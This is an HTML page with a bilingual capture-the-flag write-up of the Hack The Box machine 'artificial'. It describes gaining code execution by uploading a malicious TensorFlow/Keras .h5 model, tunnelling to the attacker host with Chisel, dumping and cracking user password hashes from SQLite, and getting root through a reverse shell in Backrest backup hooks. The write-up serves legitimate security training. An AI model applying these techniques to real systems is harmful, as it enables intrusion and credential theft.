<!DOCTYPE html>
<html lang="es" data-theme="light">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>artificial | Writeup</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="../../index.css">
</head>

<body>
  <nav class="top-nav">
    <div class="container">
      <div class="nav-content">
        <div class="nav-left">
          <a href="../../index.html" class="back-link" title="Back to home">‚Üê</a>
          <h1 data-i18n="site-title">KDW_LABS</h1>
        </div>
        <div class="nav-controls">
          <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
            <span class="theme-icon">üåô</span>
          </button>
          <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
            <span>EN</span>
          </button>
        </div>
      </div>
    </div>
  </nav>

  <main class="container">
    <header class="machine-header">
      <h1 class="machine-title">artificial</h1>
      <div class="machine-meta">
        <span class="badge badge-platform">HTB</span>
        <span class="badge badge-difficulty-easy">easy</span>
      </div>
    </header>

    <article class="machine-content">
      <div id="content-en" class="lang-content" style="display:none;">
        <div class="machine-summary">
          <h2 data-i18n="summary-title">Exploitation Summary</h2>
          <p><strong>Exploitation process:</strong> Discovered a web application that allowed the upload of AI models in
            <code>.h5</code> format. A Remote Code Execution (RCE) vulnerability in TensorFlow/Keras was exploited by
            creating a malicious model, leading to an initial shell as the <code>app</code> user. System reconnaissance
            revealed password hashes for several users in an SQLite database, one of which yielded the password for
            <code>gael</code>. After escalating to <code>gael</code>, a compressed archive containing the Backrest
            service configuration was found, providing the administrator's password hash. Once the Backrest password was
            cracked, the service's "hooks" functionality was leveraged to execute commands as root during the backup
            process.</p>
          <p><strong>Technologies/Exploits:</strong> TensorFlow H5 RCE, SQLite Credential Leak, Backrest RCE.</p>
        </div>
        <hr class="summary-divider">
        <p>Nmap:</p>
        <p><img src="./media/image9.png" alt="Nmap Results" /></p>
        <p>I add <code>artificial.htb</code> to <code>/etc/hosts</code>.</p>
        <p>Initial Gobuster scans don't reveal any paths beyond what's visible on the site:</p>
        <p><img src="./media/image14.png" alt="Gobuster Results" /></p>
        <p>The website is simple, promoting an AI product with registration and login features.</p>
        <p>After logging in and visiting <code>/dashboard</code>, I see this:</p>
        <p><img src="./media/image7.png" alt="Dashboard" /></p>
        <p>It seems I can upload my own AI models for the machine to process. This looks like a prime attack vector.</p>
        <p><img src="./media/image2.png" alt="Upload Info" /></p>
        <p>Downloading the sample files shows that the system expects <code>.h5</code> files. Researching
          <code>.h5</code> reveals they are used for TensorFlow models. I find a resource explaining how to create a
          malicious model that executes Python code when loaded: <a
            href="https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model">TensorFlow
            RCE Guide</a>.</p>
        <p>Interestingly, newer versions of Keras (v3) have patched this, but older versions remain vulnerable. Some
          exploits even force a Keras downgrade to ensure the attack works.</p>
        <p>After testing different versions, I reproduced RCE by "compiling" this code into an <code>.h5</code> file and
          uploading it:</p>
        <p><img src="./media/image8.png" alt="Payload Code" /></p>
        <p>I upgrade the payload to a reverse shell and gain access as the <code>app</code> user. There's another user
          named <code>gael</code>:</p>
        <p><img src="./media/image4.png" alt="Whoami app" /></p>
        <p>Checking open ports with <code>ss -tuln</code> reveals internal services:</p>
        <p><img src="./media/image15.png" alt="Internal Ports" /></p>
        <p>In <code>/opt</code>, I find a <code>backrest</code> directory with a script suggesting a backup service is
          running on port <code>9898</code>. I use Chisel for local port forwarding to explore it.</p>
        <p>On my machine:</p>
        <pre><code class="language-bash">./chisel server -p 1234 --reverse</code></pre>
        <p>On the victim:</p>
        <pre><code class="language-bash">./chisel client 10.10.14.91:1234 R:9898:127.0.0.1:9898</code></pre>
        <p>The portal requires credentials:</p>
        <p><img src="./media/image3.png" alt="Backrest Portal" /></p>
        <p>In <code>app/instance</code>, I find <code>users.db</code> (SQLite). Extracting user info:</p>
        <pre><code class="language-bash">sqlite3 users.db "select * from user;"</code></pre>
        <pre><code class="language-text">1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|admin|admin@artificial.htb|21232f297a57a5a743894a0e4a801fc3</code></pre>
        <p>CrackStation yields <code>gael</code>'s password: <code>mattp005numbertwo</code>. I escalate to
          <code>gael</code> and find the user flag:</p>
        <p><img src="./media/image1.png" alt="User Flag" /></p>
        <p>Gael is part of a group with read access to a <code>.tar.gz</code> backup. Even if root owns the extracted
          files, I can read the archive contents:</p>
        <p><img src="./media/image5.png" alt="Group Permissions" /></p>
        <p><img src="./media/image10.png" alt="Archive Content" /></p>
        <p>I find a base64-encoded hash: <code>$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</code>.
          Hashcat cracks it using <code>rockyou.txt</code>, revealing the password: <code>!@#$%^</code>.</p>
        <p>This password grants access to the Backrest service. Backrest allows defining backup plans with custom
          "hooks" that execute commands.</p>
        <p><img src="./media/image6.png" alt="Backrest Dashboard" /></p>
        <p><img src="./media/image16.png" alt="Backrest Hooks" /></p>
        <p>By adding a hook with a reverse shell and triggering a manual backup, I gain RCE as root, since the service
          runs with root privileges.</p>
        <p><img src="./media/image11.png" alt="Triggering Backup" /></p>
        <p><img src="./media/image13.png" alt="Root Shell" /></p>
      </div>

      <div id="content-es" class="lang-content">
        <div class="machine-summary">
          <h2 data-i18n="summary-title">Resumen de Explotaci√≥n</h2>
          <p><strong>Resumen del proceso:</strong> Se descubri√≥ una aplicaci√≥n web que permit√≠a subir modelos de
            inteligencia artificial en formato <code>.h5</code>. El cual es vulnerable a una ejecuci√≥n remota de c√≥digo
            (RCE) en TensorFlow/Keras mediante la creaci√≥n de un modelo malicioso para obtener una shell como el usuario
            <code>app</code>. Tras investigar el sistema, se encontraron hashes de contrase√±as de varios usuarios en una
            base de datos SQLite, logrando crackear la contrase√±a de <code>gael</code>. Elevando privilegios a
            <code>gael</code>, se descubri√≥ un archivo comprimido que conten√≠a la configuraci√≥n del servicio Backrest,
            el cual inclu√≠a el hash de la contrase√±a de administrador. Una vez crackeada la contrase√±a de Backrest, se
            utiliz√≥ la funcionalidad de "hooks" del servicio para ejecutar comandos como root durante el proceso de
            backup.</p>
          <p><strong>Tecnolog√≠as/Exploits:</strong> TensorFlow H5 RCE, SQLite Credential Leak, Backrest RCE.</p>
        </div>
        <hr class="summary-divider">
        <p>Nmap:</p>
        <p><img src="./media/image9.png" alt="Resultados de Nmap" /></p>
        <p>A√±ado <code>artificial.htb</code> al <code>/etc/hosts</code>.</p>
        <p>De primeras Gobuster no reporta rutas fuera de las que ya veo en la web:</p>
        <p><img src="./media/image14.png" alt="Resultados de Gobuster" /></p>
        <p>La web es simple, promociona un producto de inteligencia artificial y tiene un registro y login.</p>
        <p>Cuando hago login y entro a <code>/dashboard</code> veo esto:</p>
        <p><img src="./media/image7.png" alt="Dashboard" /></p>
        <p>Parece que puedo subir mis modelos de IA y los corre en su m√°quina, una gran v√≠a de ataque.</p>
        <p><img src="./media/image2.png" alt="Info de Subida" /></p>
        <p>De los archivos de ejemplo veo que espera un archivo con extensi√≥n <code>.h5</code>. Investigo sobre la
          extensi√≥n y veo que se usa para modelos de TensorFlow. Encuentro un recurso para crear un modelo malicioso que
          ejecuta c√≥digo Python al cargarse.</p>
        <p>Keras v3 ya tiene esto parcheado, pero versiones antiguas siguen siendo vulnerables. Algunos ataques incluso
          fuerzan un downgrade de Keras para funcionar.</p>
        <p>Consigo reproducir el RCE "compilando" este c√≥digo en un <code>.h5</code> y subi√©ndolo:</p>
        <p><img src="./media/image8.png" alt="C√≥digo del Payload" /></p>
        <p>Uso una reverse shell y consigo acceso como <code>app</code>. Hay otro usuario llamado <code>gael</code>:</p>
        <p><img src="./media/image4.png" alt="Whoami app" /></p>
        <p>Con <code>ss -tuln</code> veo puertos internos:</p>
        <p><img src="./media/image15.png" alt="Puertos Internos" /></p>
        <p>En <code>/opt</code> veo un directorio <code>backrest</code> con un script que revela el servicio en el
          puerto <code>9898</code>. Uso Chisel para local port forwarding.</p>
        <p>En mi m√°quina:</p>
        <pre><code class="language-bash">./chisel server -p 1234 --reverse</code></pre>
        <p>En la v√≠ctima:</p>
        <pre><code class="language-bash">./chisel client 10.10.14.91:1234 R:9898:127.0.0.1:9898</code></pre>
        <p>El portal pide credenciales:</p>
        <p><img src="./media/image3.png" alt="Portal Backrest" /></p>
        <p>En <code>app/instance</code> encuentro <code>users.db</code> (SQLite). Extraigo info de usuarios:</p>
        <pre><code class="language-bash">sqlite3 users.db "select * from user;"</code></pre>
        <pre><code class="language-text">1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|admin|admin@artificial.htb|21232f297a57a5a743894a0e4a801fc3</code></pre>
        <p>CrackStation me da la pass de <code>gael</code>: <code>mattp005numbertwo</code>. Hago <code>su gael</code> y
          consigo la flag:</p>
        <p><img src="./media/image1.png" alt="Flag de Usuario" /></p>
        <p>Gael est√° en un grupo con permisos de lectura de un <code>.tar.gz</code>. Puedo leer los archivos dentro del
          comprimido:</p>
        <p><img src="./media/image5.png" alt="Permisos de Grupo" /></p>
        <p><img src="./media/image10.png" alt="Contenido del Archivo" /></p>
        <p>Encuentro un hash en base64: <code>$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</code>.
          Hashcat lo crackea con <code>rockyou.txt</code>: <code>!@#$%^</code>.</p>
        <p>Esta pass sirve para Backrest. Backrest permite a√±adir planes de backup con "hooks" que ejecutan comandos.
        </p>
        <p><img src="./media/image6.png" alt="Dashboard de Backrest" /></p>
        <p><img src="./media/image16.png" alt="Hooks de Backrest" /></p>
        <p>A√±adiendo un hook con reverse shell y lanzando un backup manual, consigo RCE como root.</p>
        <p><img src="./media/image11.png" alt="Lanzando Backup" /></p>
        <p><img src="./media/image13.png" alt="Shell de Root" /></p>
      </div>
    </article>
  </main>
  <script src="../../index.js"></script>
</body>

</html>